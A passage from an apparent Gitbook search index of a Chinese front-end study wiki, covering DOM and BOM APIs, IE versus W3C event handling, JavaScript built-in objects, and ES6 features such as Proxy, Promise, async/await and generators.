property 不是一一对应如：form 控件中对应的是 defaultValue，修改或设置 value property 修改的是控件当前值，setAttribute 修改 value 属性不会改变 value property JS 获取 dom 的 CSS 样式 function getStyle(obj, attr) { if (obj.currentStyle) { return obj.currentStyle[attr]; } else { return window.getComputedStyle(obj, false)[attr]; } } JS 实现鼠标拖拽 DOM 操作——怎样添加、移除、移动、复制、创建和查找节点? 创建新节点 createDocumentFragment() //创建一个 DOM 片段 createElement() //创建一个具体的元素 createTextNode() //创建一个文本节点 添加、移除、替换、插入 appendChild() removeChild() replaceChild() insertBefore() //在已有的子节点前插入一个新的子节点 查找 getElementsByTagName() //通过标签名称 getElementsByName() // 通过元素的 Name 属性的值(IE 容错能力较强，会得到一个数组，其中包括 id 等于 name 值的) getElementById() //通过元素 Id，唯一性 documen.write 和 innerHTML 的区别 document.write 只能重绘整个页面 innerHTML 可以重绘页面的一部分 Window 对象 与 document 对象 window Window 对象表示当前浏览器的窗口，是 JavaScript 的顶级对象。 我们创建的所有对象、函数、变量都是 Window 对象的成员。 Window 对象的方法和属性是在全局范围内有效的。 document Document 对象是 HTML 文档的根节点与所有其他节点（元素节点，文本节点，属性节点, 注释节点） Document 对象使我们可以通过脚本对 HTML 页面中的所有元素进行访问 Document 对象是 Window 对象的一部分，即 window.document 区分什么是“客户区坐标”、“页面坐标”、“屏幕坐标” 客户区坐标 鼠标指针在可视区中的水平坐标(clientX)和垂直坐标(clientY) 页面坐标 鼠标指针在页面布局中的水平坐标(pageX)和垂直坐标 屏幕坐标 设备物理屏幕的水平坐标(screenX)和垂直坐标(screenY) focus/blur 与 focusin/focusout 的区别与联系 focus/blur 不冒泡，focusin/focusout 冒泡 focus/blur 兼容性好，focusin/focusout 在除 FireFox 外的浏览器下都保持良好兼容性，如需使用事件托管，可考虑在 FireFox 下使用事件捕获 elem.addEventListener('focus', handler, true) mouseover/mouseout 与 mouseenter/mouseleave 的区别与联系 mouseover/mouseout 是标准事件，所有浏览器都支持；mouseenter/mouseleave 是 IE5.5 引入的特有事件后来被 DOM3 标准采纳，现代标准浏览器也支持 mouseover/mouseout 是冒泡事件；mouseenter/mouseleave不冒泡。需要为多个元素监听鼠标移入/出事件时，推荐 mouseover/mouseout 托管，提高性能 标准事件模型中 event.target 表示发生移入/出的元素,vent.relatedTarget对应移出/如元素；在老 IE 中 event.srcElement 表示发生移入/出的元素，event.toElement表示移出的目标元素，event.fromElement表示移入时的来源元素 IE 的事件处理和 W3C 的事件处理有哪些区别？ 绑定事件 W3C: targetEl.addEventListener('click', handler, false); IE: targetEl.attachEvent('onclick', handler); 删除事件 W3C: targetEl.removeEventListener('click', handler, false); IE: targetEl.detachEvent(event, handler); 事件对象 W3C: var e = arguments.callee.caller.arguments[0] IE: window.event 事件目标 W3C: e.target IE: window.event.srcElement 阻止事件默认行为 W3C: e.preventDefault() IE: window.event.returnValue = false' 阻止事件传播 W3C: e.stopPropagation() IE: window.event.cancelBubble = true Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-07 15:48:36 "},"知识库/04.编程开发/03.Web前端/00.前端基础/03.JavaScript/12.BOM.html":{"url":"知识库/04.编程开发/03.Web前端/00.前端基础/03.JavaScript/12.BOM.html","title":"12.BOM","keywords":"","body":"BOM BOM 是 browser object model 的缩写， 简称浏览器对象模型。 主要处理浏览器窗口和框架， 描述了与浏览器进行交互的方法和接口， 可以对浏览器窗口进行访问和操作， 譬如可以弹出 新的窗口， 回退历史记录， 获取 url…… BOM 与 DOM 的关系 javacsript 是通过访问 BOM 对象来访问、 控制、 修改浏览器 BOM 的 window 包含了 document， 因此通过 window 对象的 document 属性就可以访问、 检索、 修改文档内容与结构。 document 对象又是 DOM 模型的根节点。 因此， BOM 包含了 DOM， 浏览器提供出来给予访问的是 BOM 对象， 从 BOM 对象再访 问到 DOM 对象， 从而 js 可以操作浏览器以及浏览器读取到的文档 BOM 对象包含哪些内容？ Window JavaScript 层级中的顶层对象， 表示浏览器窗口。 Navigator 包含客户端浏览器的信息。 History 包含了浏览器窗口访问过的 URL。 Location 包含了当前 URL 的信息。 Screen 包含客户端显示屏的信息。 History 对象 History 对象包含用户（在浏览器窗口中） 访问过的 URL 方法/属性 描述 length 返回浏览器历史列表中的 URL 数量。 back() 加载 history 列表中的前一个 URL。 forward() 加载 history 列表中的下一个 URL。 go() 加载 history 列表中的某个具体页面 Location 对象 Location 对象包含有关当前 URL 的信息。 属性 描述 hash 设置或返回从井号 (#) 开始的 URL（锚） 。 host 设置或返回主机名和当前 URL 的端口号。 hostname 设置或返回当前 URL 的主机名。 href 设置或返回完整的 URL。 pathname 设置或返回当前 URL 的路径部分。 port 设置或返回当前 URL 的端口号。 protocol 设置或返回当前 URL 的协议。 search 置或返回从问号 (?) 开始的 URL（查询部分） 。 方法 描述 assign() 加载新的文档。 reload(‘force’) 重新加载当前文档。参数可选，不填或填 false 则取浏览器缓存的文档 replace() 用新的文档替换当前文档。 Window 对象 Window 对象表示一个浏览器窗口或一个框架。 在客户端 JavaScript 中， Window 对象 是全局对象，所有的表达式都在当前的环境中计算。 例如，可以只写 document， 而 不必写 window.document。 属性 描述 closed 返回窗口是否已被关闭。 defaultStatus 设置或返回窗口状态栏中的默认文本。 （仅 Opera 支持） document 对 Document 对象的只读引用。 请参阅 Document 对象。 history 对 History 对象的只读引用。 请参数 History 对象。 innerheight 返回窗口的文档显示区的高度。 innerwidth 返回窗口的文档显示区的宽度。 length 设置或返回窗口中的框架数量。 location 用于窗口或框架的 Location 对象。 请参阅 Location 对象。 name 设置或返回窗口的名称。 Navigator 对 Navigator 对象的只读引用。 请参数 Navigator 对象。 opener 返回对创建此窗口的窗口的引用。 outerheight 返回窗口的外部高度。 outerwidth 返回窗口的外部宽度。 pageXOffset 设置或返回当前页面相对于窗口显示区左上角的 X 位置。 pageYOffset 设置或返回当前页面相对于窗口显示区左上角的 Y 位置。 parent 返回父窗口。 Screen 对 Screen 对象的只读引用。 请参数 Screen 对象。 self 返回对当前窗口的引用。 等价于 Window 属性。 status 设置窗口状态栏的文本。 (默认只支持 Opera) top 返回最顶层的先辈窗口。 window window 属性等价于 self 属性， 它包含了对窗口自身的引用。 screenLeft screenTop screenX screenY 只读整数。声明了窗口的左上角在屏幕上的的 x 坐标和 y 坐标。 IE、 Safari、 Chrome 和 Opera 支持 screenLeft 和 screenTop， 而 Chrome、 Firefox 和 Safari 支持 screenX 和 screenY。 方法 描述 alert() 显示带有一段消息和一个确认按钮的警告框。 blur() 把键盘焦点从顶层窗口移开。 confirm() 显示带有一段消息以及确认按钮和取消按钮的对话框。 createPopup() 创建一个弹出窗口。 只有 ie 支持（不包括 ie11） focus() 把键盘焦点给予一个窗口。 moveBy() 可相对窗口的当前坐标把它移动指定的像素。 moveTo() 把窗口的左上角移动到一个指定的坐标。 open() 打开一个新的浏览器窗口或查找一个已命名的窗口。 window.open(URL,name,features,replace) print() 打印当前窗口的内容。 prompt() 显示可提示用户输入的对话框。 resizeBy() 按照指定的像素调整窗口的大小。 resizeTo() 把窗口的大小调整到指定的宽度和高度。 scrollBy() 按照指定的像素值来滚动内容。 scrollTo() 把内容滚动到指定的坐标。 setInterval() 按照指定的周期（以毫秒计） 来调用函数或计算表达式。 setTimeout() 在指定的毫秒数后调用函数或计算表达式。 clearInterval() 取消由 setInterval() 设置的 timeout。 clearTimeout() 取消由 setTimeout() 方法设置的 timeout。close() 关闭浏览器窗口 Navigator 对象 Navigator 对象包含的属性描述了正在使用的浏览器。 可以使用这些属性进行平台专用的配置。 虽然这个对象的名称显而易见的是 Netscape 的 Navigator 浏览器， 但其他实现了 JavaScript 的浏览器也支持这个对象。 属性 描述 appCodeName 返回浏览器的代码名。 以 Netscape 代码为基础的浏览器中， 它的值是 \"Mozilla\"。Microsoft 也是 appMinorVersion 返回浏览器的次级版本。 （IE4、 Opera 支持） appName 返回浏览器的名称。 appVersion 返回浏览器的平台和版本信息。 browserLanguage 返回当前浏览器的语言。 （IE 和 Opera 支持）cookieEnabled 返回指明浏览器中是否启用 cookie 的布尔值。 cpuClass 返回浏览器系统的 CPU 等级。 （IE 支持） onLine 返回指明系统是否处于脱机模式的布尔值。 platform 返回运行浏览器的操作系统平台。 systemLanguage 返回当前操作系统的默认语言。 （IE 支持） userAgent 返回由客户机发送服务器的 user-agent 头部的值。 userLanguage 返回操作系统设定的自然语言。 （IE 和 Opera 支持） plugins 返回包含客户端安装的所有插件的数组 方法 描述 javaEnabled() 规定浏览器是否支持并启用了 Java。 taintEnabled() 规定浏览器是否启用数据污点 (data tainting)。 Screen 对象 Screen 对象包含有关客户端显示屏幕的信息。 每个 Window 对象的 screen 属性都引用一个 Screen 对象。 Screen 对象中存放着有关显示浏览器屏幕的信息。 JavaScript 程序将利用这些信息来优化它们的输出， 以达到用户的显示要求。 例如，一个程序可以根据显示器的尺寸选择使用大图像还是使用小图像，它还可以根据显示器的颜色深度选择使用 16 位色还是使用 8 位色的图形。 另外，JavaScript 程序还能根有关屏幕尺寸的信息将新的浏览器窗口定位在屏幕中间。 属性 描述 availHeight 返回显示屏幕的高度 (除 Windows 任务栏之外)。 availWidth 返回显示屏幕的宽度 (除 Windows 任务栏之外)。 bufferDepth 设置或返回调色板的比特深度。 （仅 IE 支持）colorDepth 返回目标设备或缓冲器上的调色板的比特深度。 deviceXDPI 返回显示屏幕的每英寸水平点数。 （仅 IE 支持） deviceYDPI 返回显示屏幕的每英寸垂直点数。 （仅 IE 支持） fontSmoothingEnabled 返回用户是否在显示控制面板中启用了字体平滑。 （仅 IE 支持） height 返回显示屏幕的高度。 logicalXDPI 返回显示屏幕每英寸的水平方向的常规点数。 （仅 IE 支持） logicalYDPI 返回显示屏幕每英寸的垂直方向的常规点数。 （仅 IE 支持） pixelDepth 返回显示屏幕的颜色分辨率（比特每像素） 。 updateInterval 设置或返回屏幕的刷新率。 （仅 IE11 以下支持） width 返回显示器屏幕的宽度。 检测浏览器版本版本有哪些方式？ 根据 navigator.userAgent // UA.toLowerCase().indexOf('chrome') 根据 window 对象的成员 // 'ActiveXObject' in window offsetWidth/offsetHeight,clientWidth/clientHeight 与 scrollWidth/scrollHeight 的区别 offsetWidth/offsetHeight 返回值包含 content + padding + border，效果与 e.getBoundingClientRect()相同 clientWidth/clientHeight 返回值只包含 content + padding，如果有滚动条，也不包含滚动条 scrollWidth/scrollHeight 返回值包含 content + padding + 溢出内容的尺寸 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-07 14:13:23 "},"知识库/04.编程开发/03.Web前端/00.前端基础/03.JavaScript/13.全局内置对象.html":{"url":"知识库/04.编程开发/03.Web前端/00.前端基础/03.JavaScript/13.全局内置对象.html","title":"13.全局内置对象","keywords":"","body":"对象 JS 中有那些内置对象 数据封装类对象 String、Array、Object、Boolean、Number 其他对象 Math、Date、RegExp、Error、Function、Arguments ES6 新增对象 Promise、Map、Set、Symbol、Proxy、Reflect 数组 Array 对象常用方法 修改器方法, 下面的这些方法会改变调用它们的对象自身的值： Array.prototype.pop() 删除数组的最后一个元素，并返回这个元素。 Array.prototype.push() 在数组的末尾增加一个或多个元素，并返回数组的新长度。 - Array.prototype.shift() 删除数组的第一个元素，并返回这个元素。 Array.prototype.unshift() 在数组的开头增加一个或多个元素，并返回数组的新长度。 - Array.prototype.splice() 在任意的位置给数组添加或删除任意个元素。 - Array.prototype.reverse() 颠倒数组中元素的排列顺序，即原先的第一个变为最后一个，原先的最后一个变为第一个。 Array.prototype.sort() 对数组元素进行排序，并返回当前数组。 - Array.prototype.fill() 将数组中指定区间的所有元素的值，都替换成某个固定的值。 Array.prototype.copyWithin() 在数组内部，将一段元素序列拷贝到另一段元素序列上，覆盖原有的值。 访问方法, 下面的这些方法绝对不会改变调用它们的对象的值，只会返回一个新的数组或者返回一个其它的期望值。 Array.prototype.join() 连接所有数组元素组成一个字符串。 - Array.prototype.slice([begin[, end]]) 抽取当前数组中的一段元素组合成一个新数组。 Array.prototype.concat() 返回一个由当前数组和其它若干个数组或者若干个非数组值组合而成的新数组。 - Array.prototype.includes() 判断当前数组是否包含某指定的值，如果是返回 true，否则返回 false。 Array.prototype.indexOf() 返回数组中第一个与指定值相等的元素的索引，如果找不到这样的元素，则返回 -1。 Array.prototype.lastIndexOf() 返回数组中最后一个（从右边数第一个）与指定值相等的元素的索引，如果找不到这样的元素，则返回 -1。 - Array.prototype.toSource() 返回一个表示当前数组字面量的字符串。遮蔽了原型链上的 Object.prototype.toSource() 方法。 Array.prototype.toString() 返回一个由所有数组元素组合而成的字符串。遮蔽了原型链上的 Object.prototype.toString() 方法。 Array.prototype.toLocaleString() 返回一个由所有数组元素组合而成的本地化后的字符串。遮蔽了原型链上的 Object.prototype.toLocaleString() 方法。 迭代方法 在下面的众多遍历方法中，有很多方法都需要指定一个回调函数作为参数。在每一个数组元素都分别执行完回调函数之前，数组的 length 属性会被缓存在某个地方，所以，如果你在回调函数中为当前数组添加了新的元素，那么那些新添加的元素是不会被遍历到的。此外，如果在回调函数中对当前数组进行了其它修改，比如改变某个元素的值或者删掉某个元素，那么随后的遍历操作可能会受到未预期的影响。总之，不要尝试在遍历过程中对原数组进行任何修改，虽然规范对这样的操作进行了详细的定义，但为了可读性和可维护性，请不要这样做。 Array.prototype.forEach() 为数组中的每个元素执行一次回调函数 Array.prototype.filter() 将所有在过滤函数中返回 true 的数组元素放进一个新数组中并返回。 - Array.prototype.map() 返回一个由回调函数的返回值组成的新数组。 Array.prototype.reduce() 从左到右为每个数组元素执行一次回调函数，并把上次回调函数的返回值放在一个暂存器中传给下次回调函数，并返回最后一次回调函数的返回值。 - Array.prototype.every() 如果数组中的每个元素都满足测试函数，则返回 true，否则返回 false。 Array.prototype.some() 如果数组中至少有一个元素满足测试函数，则返回 true，否则返回 false。 - Array.prototype.find() 找到第一个满足测试函数的元素并返回那个元素的值，如果找不到，则返回 undefined。 Array.prototype.findIndex() 找到第一个满足测试函数的元素并返回那个元素的索引，如果找不到，则返回 -1。 - Array.prototype.keys() 返回一个数组迭代器对象，该迭代器会包含所有数组元素的键。 Array.prototype.entries() 返回一个数组迭代器对象，该迭代器会包含所有数组元素的键值对。 字符串常用 API String.prototype.split() 通过分离字符串成字串，将字符串对象分割成字符串数组。 String.prototype.slice(start, end) 摘取一个字符串区域，返回一个新的字符串。 - String.prototype.substr(start, len) 通过指定字符数返回在指定位置开始的字符串中的字符。 String.prototype.substring() 返回在字符串中指定两个下标之间的字符 - String.prototype.trim() 从字符串的开始和结尾去除空格 String.prototype.concat() 连接两个字符串文本，并返回一个新的字符串。 - String.prototype.match() 使用正则表达式与字符串相比较。 String.prototype.search() 对正则表达式和指定字符串进行匹配搜索，返回第一个出现的匹配项的下标。 String.prototype.replace() 被用来在正则表达式和字符串直接比较，然后用新的子串来替换被匹配的子串。 - String.prototype.toString() 返回用字符串表示的特定对象。重写 Object.prototype.toString 方法。 Set、Map、WeakSet 和 WeakMap 的区别？ Set 表示有没有，成员的值都是唯一的，没有重复的值 可以接受一个数组（或可迭代的数据结构）作为参数 注：两个对象总是不相等的 属性： Set.prototype.constructor：构造函数，默认就是 Set 函数。 Set.prototype.size：返回 Set 实例的成员总数。 方法： add(value)：添加某个值，返回 Set 结构本身。 s.add(1).add(2).add(2); delete(value)：删除某个值，返回一个布尔值，表示删除是否成功。 has(value)：返回一个布尔值，表示该值是否为 Set 的成员。 clear()：清除所有成员，没有返回值。 遍历方法 keys()：返回键名的遍历器 values()：返回键值的遍历器 entries()：返回键值对的遍历器 forEach()：使用回调函数遍历每个成员 WeakSet WeakSet 结构与 Set 类似，也是不重复的值的集合。但与 Set 有几个区别： WeakSet 的成员只能是对象，而不能是其他类型的值 WeakSet 中的对象都是弱引用 如果其他对象都不再引用该对象，那么垃圾回收机制会自动回收该对象所占用的内存 垃圾回收机制依赖引用计数，如果一个值的引用次数不为 0，垃圾回收机制就不会释放这块内存。结束使用该值之后，有时会忘记取消引用，导致内存无法释放，进而可能会引发内存泄漏。WeakSet 里面的引用，都不计入垃圾回收机制，所以就不存在这个问题。因此，WeakSet 适合临时存放一组对象，以及存放跟对象绑定的信息。只要这些对象在外部消失，它在 WeakSet 里面的引用就会自动消失。 WeakSet 不可遍历 由于 WeakSet 内部有多少个成员，取决于垃圾回收机制有没有运行，运行前后很可能成员个数是不一样的，而垃圾回收机制何时运行是不可预测的 WeakSet 结构中没有 clear 方法。 Map 类似于对象，也是键值对的集合，但是“键”的范围不限于字符串，各种类型的值（包括对象）都可以当作 Map 的键。 遍历方法 Map 结构原生提供三个遍历器生成函数和一个遍历方法。 keys()：返回键名的遍历器。 values()：返回键值的遍历器。 entries()：返回所有成员的遍历器。 forEach()：遍历 Map 的所有成员。 WeakMap WeakMap 的设计目的在于: 有时我们想在某个对象上面存放一些数据，但是这会形成对于这个对象的引用，而一旦不再需要这两个对象，我们就必须手动删除这个引用，否则垃圾回收机制就不会释放被引用对象占用的内存。 基本上，如果你要往对象上添加数据，又不想干扰垃圾回收机制，就可以使用 WeakMap。 一个典型应用场景是，在网页的 DOM 元素上添加数据，就可以使用 WeakMap 结构。当该 DOM 元素被清除，其所对应的 WeakMap 记录就会自动被移除。 WeakMap 应用场景 1. 在 DOM 对象上保存相关数据 在网页的 DOM 元素上添加数据，就可以使用 WeakMap 结构。当该 DOM 元素被清除，其所对应的 WeakMap 记录就会自动被移除。 传统使用 jQuery 的时候，我们会通过 $.data() 方法在 DOM 对象上储存相关信息(就比如在删除按钮元素上储存帖子的 ID 信息)，jQuery 内部会使用一个对象管理 DOM 和对应的数据，当你将 DOM 元素删除，DOM 对象置为空的时候，相关联的数据并不会被删除，你必须手动执行 $.removeData() 方法才能删除掉相关联的数据，WeakMap 就可以简化这一操作： let wm = new WeakMap(), element = document.querySelector(\".element\"); wm.set(element, \"data\"); let value = wm.get(elemet); console.log(value); // data element.parentNode.removeChild(element); element = null; 2. 数据缓存 从上一个例子，我们也可以看出，当我们需要关联对象和数据，比如在不修改原有对象的情况下储存某些属性或者根据对象储存一些计算的值等，而又不想管理这些数据的死活时非常适合考虑使用 WeakMap。数据缓存就是一个非常好的例子： const cache = new WeakMap(); function getObjCalcData(obj) { if (cache.has(obj)) { console.log(\"Cached\"); return cache.get(obj); } else { console.log(\"Computed\"); const res = calcData(obj); // 一个依赖obj的复杂运算 cache.set(obj, res); return res; } } 3. 私有属性 WeakMap 也可以被用于实现私有变量，不过在 ES6 中实现私有变量的方式有很多种，这只是其中一种： const privateData = new WeakMap(); class Person { constructor(name, age) { privateData.set(this, { name: name, age: age }); } getName() { return privateData.get(this).name; } getAge() { return privateData.get(this).age; } } export default Person; Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-07 15:48:35 "},"知识库/04.编程开发/03.Web前端/00.前端基础/03.JavaScript/14.ES6.html":{"url":"知识库/04.编程开发/03.Web前端/00.前端基础/03.JavaScript/14.ES6.html","title":"14.ES6","keywords":"","body":"ES6 var、let 及 const 区别？ 全局申明的 var 变量会挂载在 window 上，而 let 和 const 不会 var 声明变量存在变量提升，let 和 const 不会 let、const 的作用范围是块级作用域，而 var 的作用范围是函数作用域 同一作用域下 let 和 const 不能声明同名变量，而 var 可以 同一作用域下在 let 和 const 声明前使用会存在暂时性死区 const 一旦声明必须赋值,不能使用 null 占位 声明后不能再修改 如果声明的是复合类型数据，可以修改其属性 Proxy Proxy 是 ES6 中新增的功能，它可以用来自定义对象中的操作。 Vue3.0 中将会通过 Proxy 来替换原本的 Object.defineProperty 来实现数据响应式。 let p = new Proxy(target, handler); target 代表需要添加代理的对象，handler 用来自定义对象中的操作，比如可以用来自定义 set 或者 get 函数。 let onWatch = (obj, setBind, getLogger) => { let handler = { set(target, property, value, receiver) { setBind(value, property); return Reflect.set(target, property, value); }, get(target, property, receiver) { getLogger(target, property); return Reflect.get(target, property, receiver); }, }; return new Proxy(obj, handler); }; let obj = { a: 1 }; let p = onWatch( obj, (v, property) => { console.log(`监听到属性${property}改变为${v}`); }, (target, property) => { console.log(`'${property}' = ${target[property]}`); } ); p.a = 2; // 控制台输出：监听到属性a改变 p.a; // 'a' = 2 自定义 set 和 get 函数的方式，在原本的逻辑中插入了我们的函数逻辑，实现了在对对象任何属性进行读写时发出通知。 当然这是简单版的响应式实现，如果需要实现一个 Vue 中的响应式，需要我们在 get 中收集依赖，在 set 派发更新，之所以 Vue3.0 要使用 Proxy 替换原本的 API 原因在于 Proxy 无需一层层递归为每个属性添加代理，一次即可完成以上操作，性能上更好，并且原本的实现有一些数据更新不能监听到，但是 Proxy 可以完美监听到任何方式的数据改变，唯一缺陷可能就是浏览器的兼容性不好了。 map map 作用是生成一个新数组，遍历原数组，将每个元素拿出来做一些变换然后返回一个新数组，原数组不发生改变。 map 的回调函数接受三个参数，分别是当前索引元素，索引，原数组 var arr = [1, 2, 3]; var arr2 = arr.map((item) => item + 1); arr; //[ 1, 2, 3 ] arr2; // [ 2, 3, 4 ] ['1', '2', '3'].map(parseInt); // -> [ 1, NaN, NaN ] 第一个 parseInt('1', 0) -> 1 第二个 parseInt('2', 1) -> NaN 第三个 parseInt('3', 2) -> NaN filter filter 的作用也是生成一个新数组，在遍历数组的时候将返回值为 true 的元素放入新数组，我们可以利用这个函数删除一些不需要的元素 filter 的回调函数接受三个参数，分别是当前索引元素，索引，原数组 reduce reduce 可以将数组中的元素通过回调函数最终转换为一个值。 如果我们想实现一个功能将函数里的元素全部相加得到一个值，可能会这样写代码 const arr = [1, 2, 3]; let total = 0; for (let i = 0; i 但是如果我们使用 reduce 的话就可以将遍历部分的代码优化为一行代码 const arr = [1, 2, 3]; const sum = arr.reduce((acc, current) => acc + current, 0); console.log(sum); 对于 reduce 来说，它接受两个参数，分别是回调函数和初始值，接下来我们来分解上述代码中 reduce 的过程 首先初始值为 0，该值会在执行第一次回调函数时作为第一个参数传入 回调函数接受四个参数，分别为累计值、当前元素、当前索引、原数组，后三者想必大家都可以明白作用，这里着重分析第一个参数 在一次执行回调函数时，当前值和初始值相加得出结果 1，该结果会在第二次执行回调函数时当做第一个参数传入 所以在第二次执行回调函数时，相加的值就分别是 1 和 2，以此类推，循环结束后得到结果 6。 Es6 中箭头函数与普通函数的区别？ 普通 function 的声明在变量提升中是最高的，箭头函数没有函数提升 箭头函数没有属于自己的this，arguments 箭头函数不能作为构造函数，不能被 new，没有 property 不可以使用 yield 命令，因此箭头函数不能用作 Generator 函数 不可以使用 new 命令，因为： 没有自己的 this，无法调用 call，apply 没有 prototype 属性 ，而 new 命令在执行时需要将构造函数的 prototype 赋值给新的对象的 __proto__ Promise Promise 翻译过来就是承诺的意思，这个承诺会在未来有一个确切的答复，并且该承诺有三种状态，这个承诺一旦从等待状态变成为其他状态就永远不能更改状态了。 等待中（pending） 完成了（resolved） 拒绝了（rejected） 当我们在构造 Promise 的时候，构造函数内部的代码是立即执行的。 new Promise((resolve, reject) => { console.log('new Promise'); resolve('success'); }); console.log('finifsh'); // 先打印new Promise， 再打印 finifsh Promise 实现了链式调用，也就是说每次调用 then 之后返回的都是一个 Promise，并且是一个全新的 Promise，原因也是因为状态不可变。如果你在 then 中 使用了 return，那么 return 的值会被 Promise.resolve() 包装。 Promise.resolve(1) .then((res) => { console.log(res); // => 1 return 2; // 包装成 Promise.resolve(2) }) .then((res) => { console.log(res); // => 2 }); 当然了，Promise 也很好地解决了回调地狱的问题 ajax(url) .then((res) => { console.log(res); return ajax(url1); }) .then((res) => { console.log(res); return ajax(url2); }) .then((res) => console.log(res)); 其实它也是存在一些缺点的，比如无法取消 Promise，错误需要通过回调函数捕获。 async 和 await 一个函数如果加上 async ，那么该函数就会返回一个 Promise async function test() { return '1'; } console.log(test()); // -> Promise {: \"1\"} async 就是将函数返回值使用 Promise.resolve() 包裹了下，和 then 中处理返回值一样，并且 await 只能配套 async 使用。 async function test() { let value = await sleep(); } async 和 await 可以说是异步终极解决方案了，相比直接使用 Promise 来说，优势在于处理 then 的调用链，能够更清晰准确的写出代码，毕竟写一大堆 then 也很恶心，并且也能优雅地解决回调地狱问题。 当然也存在一些缺点，因为 await 将异步代码改造成了同步代码，如果多个异步代码没有依赖性却使用了 await 会导致性能上的降低。 async function test() { // 以下代码没有依赖性的话，完全可以使用 Promise.all 的方式 // 如果有依赖性的话，其实就是解决回调地狱的例子了 await fetch(url); await fetch(url1); await fetch(url2); } 看一个使用 await 的例子： let a = 0; let b = async () => { a = a + (await 10); console.log('2', a); }; b(); a++; console.log('1', a); //先输出 ‘1’, 1 //在输出 ‘2’, 10 首先函数 b 先执行，在执行到 await 10 之前变量 a 还是 0，因为 await 内部实现了 generator ，generator 会保留堆栈中东西，所以这时候 a = 0 被保存了下来 因为 await 是异步操作，后来的表达式不返回 Promise 的话，就会包装成 Promise.reslove(返回值)，然后会去执行函数外的同步代码 同步代码 a++ 与打印 a 执行完毕后开始执行异步代码，将保存下来的值拿出来使用，这时候 a = 0 + 10 上述解释中提到了 await 内部实现了 generator，其实 await 就是 generator 加上 Promise 的语法糖，且内部实现了自动执行 generator。 代码分析题 function wait() { return new Promise((resolve) => setTimeout(resolve, 1000)); } async function main() { console.time(); const x = wait(); const y = wait(); const z = wait(); await x; await y; await z; console.timeEnd(); } main(); 答案： 输出耗时： 1 秒多一点点。 原因： 3 个 wait 函数在赋值的时候就已经开始执行了。 稍微改造一下就可以得到 3 * 1000 ms 以上的结果 function wait() { return new Promise((resolve) => setTimeout(resolve, 1000)); } async function main() { console.time(); const x = await wait(); const y = await wait(); const z = await wait(); console.timeEnd(); } main(); Generator 生成器 function* foo(x) { let y = 2 * (yield x + 1); let z = yield y / 3; return x + y + z; } let it = foo(5); console.log(it.next()); // => {value: 6, done: false} console.log(it.next(12)); // => {value: 8, done: false} console.log(it.next(13)); // => {value: 42, done: true} 首先 Generator 函数调用和普通函数不同，它会返回一个迭代器 当执行第一次 next 时，传参会被忽略，并且函数暂停在 yield (x + 1) 处，所以返回 5 + 1 = 6 当执行第二次 next 时，传入的参数等于上一个 yield 的返回值，如果你不传参，yield 永远返回 undefined。此时 let y = 2 12，所以第二个 yield 等于 2 12 / 3 = 8 当执行第三次 next 时，传入的参数会传递给 z，所以 z = 13, x = 5, y = 24，相加等于 42 生成器原理 当 yeild 产生一个值后，生成器的执行上下文就会从栈中弹出。但由于迭代器一直保持着队执行上下文的引用，上下文不会丢失，不会像普通函数一样执行完后上下文就被销毁 ES Module ES Module 是原生实现的模块化方案，与 CommonJS 有以下几个区别 CommonJS 支持动态导入，也就是 require(${path}/xx.js)，后者目前不支持，但是已有提案 CommonJS 是同步导入，因为用于服务端，文件都在本地，同步导入即使卡住主线程影响也不大。而后者是异步导入，因为用于浏览器，需要下载文件，如果也采用同步导入会对渲染有很大影响 CommonJS 在导出时都是值拷贝，就算导出的值变了，导入的值也不会改变，所以如果想更新值，必须重新导入一次。但是 ES Module 采用实时绑定的方式，导入导出的值都指向同一个内存地址，所以导入值会跟随导出值变化 ES Module 会编译成 require/exports 来执行的 // 引入模块 API import XXX from './a.js'; import { XXX } from './a.js'; // 导出模块 API export function a() {} export default function () {} 为什么 ES 模块比 CommonJS 更好? ES 模块是官方标准，也是 JavaScript 语言明确的发展方向，而 CommonJS 模块是一种特殊的传统格式，在 ES 模块被提出之前做为暂时的解决方案。 ES 模块允许进行静态分析，从而实现像 tree-shaking 的优化，并提供诸如循环引用和动态绑定等高级功能。 私有方法和私有属性 阮老师 | ES6 入门 现有的解决方案 私有方法和私有属性，是只能在类的内部访问的方法和属性，外部不能访问。这是常见需求，有利于代码的封装，但 ES6 不提供，只能通过变通方法模拟实现。 一种做法是在命名上加以区别，即在函数名或属性名前加_，但这并不安全，只是一种团队规范。 另一种方法就是索性将私有方法移出类，放到模块里，因为模块内部的所有方法都是对外可见的。 class Widget { foo(baz) { bar.call(this, baz); } // ... } function bar(baz) { return (this.snaf = baz); } 上面代码中，foo 是公开方法，内部调用了 bar.call(this, baz)。这使得 bar 实际上成为了当前模块的私有方法。 还有一种方法是利用Symbol 值的唯一性，将私有方法的名字命名为一个 Symbol 值。 const bar = Symbol('bar'); const snaf = Symbol('snaf'); export default class myClass { // 公有方法 foo(baz) { this[bar](baz); } // 私有方法 [bar](baz) { return (this[snaf] = baz); } // ... } 上面代码中，bar 和 snaf 都是 Symbol 值，一般情况下无法获取到它们，因此达到了私有方法和私有属性的效果。但是也不是绝对不行，Reflect.ownKeys()依然可以拿到它们。 const inst = new myClass(); Reflect.ownKeys(myClass.prototype); // [ 'constructor', 'foo', Symbol(bar) ] Proxy Proxy 可以理解成，在目标对象之前架设一层“拦截”，外界对该对象的访问，都必须先通过这层拦截，因此提供了一种机制，可以对外界的访问进行过滤和改写。Proxy 这个词的原意是代理，用在这里表示由它来“代理”某些操作，可以译为“代理器”。 var obj = new Proxy( {}, { get: function (target, key, receiver) { console.log(`getting ${key}!`); return Reflect.get(target, key, receiver); }, set: function (target, key, value, receiver) { console.log(`setting ${key}!`); return Reflect.set(target, key, value, receiver); }, } ); Proxy 支持的拦截操作一览，一共 13 种。 get(target, propKey, receiver) 拦截对象属性的读取，比如 proxy.foo 和 proxy['foo']。 set(target, propKey, value, receiver) 拦截对象属性的设置，比如 proxy.foo = v 或 proxy['foo'] = v，返回一个布尔值。 has(target, propKey) 拦截 propKey in proxy 的操作，返回一个布尔值。 deleteProperty(target, propKey) 拦截 delete proxy[propKey]的操作，返回一个布尔值。 ownKeys(target) 拦截 Object.getOwnPropertyNames(proxy)、Object.getOwnPropertySymbols(proxy)、Object.keys(proxy)、for...in 循环，返回一个数组。该方法返回目标对象所有自身的属性的属性名，而 Object.keys()的返回结果仅包括目标对象自身的可遍历属性。 getOwnPropertyDescriptor(target, propKey) 拦截 